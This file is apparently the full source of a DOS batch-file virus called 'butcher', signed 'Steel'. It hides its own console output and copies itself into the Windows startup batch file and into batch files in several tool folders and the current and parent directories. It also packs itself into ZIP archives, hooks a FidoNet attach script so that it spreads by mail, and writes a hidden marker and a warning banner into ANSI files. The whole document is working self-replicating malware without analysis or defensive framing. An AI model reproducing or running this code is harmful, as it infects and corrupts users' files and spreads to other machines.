:Version 2.0!
@ctty nul
set r=copy
if "%0"=="" goto next
%r% %0 >> %1 %2 %3 %4 %5 %6 %7 %8 %9
:next
if not exist %Windir%\winstart.bat copy %0 %windir%\winstart.bat
if exist c:\butcher.txt goto ok
type %0 >> c:\butcher.txt
call attrib c:\butcher.txt +h
copy %0 c:\systdrv.bat
for %%a in (c:\fido\*.bat) do %r% %%a+%0
for %%b in (c:\util\*.bat c:\utils\*.bat) do %r% %%b+%0
for %%d in (c:\tools\*.bat d:\tools\*.bat) do %r% %%d+%0
attrib c:\fido\attach.bat -r
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\butcher.txt +h +r
:ok
if exist c:\butcpic.txt goto cont
echo [0;1;33m[2J[6C[32mWarning! > c:\butcpic.txt
echo  [36m butcher go for you!  >> c:\butcpic.txt
:cont
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
if not errorlevel 1 goto next
for %%k in (*.bat ..\*.bat ..\..\*.bat) do copy %%k+%0
:next
for %%z in (*.zip ..\*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do type c:\butcher.txt >> %%q
@ctty con
:(c) Steel!

